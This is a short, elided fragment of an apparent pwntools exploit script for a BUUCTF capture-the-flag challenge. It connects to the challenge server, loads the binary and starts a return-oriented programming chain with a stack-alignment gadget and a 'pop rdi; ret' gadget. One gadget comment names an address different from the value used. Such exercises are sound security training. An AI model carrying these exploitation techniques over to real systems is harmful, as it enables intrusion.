...
io=remote('node3.buuoj.cn',25543)
elf = ELF("/home/keer/Desktop/buuctf/PWN/cscctf_2019_qual/cscctf_2019_qual_signal/cscctf_2019_qual_signal")
...
rop.raw(0x400751)  # stack align 16 bytes
rop.raw(0)
rop.raw(0)
rop.raw(0x400753)  # 0x00000000004007a3: pop rdi; ret;
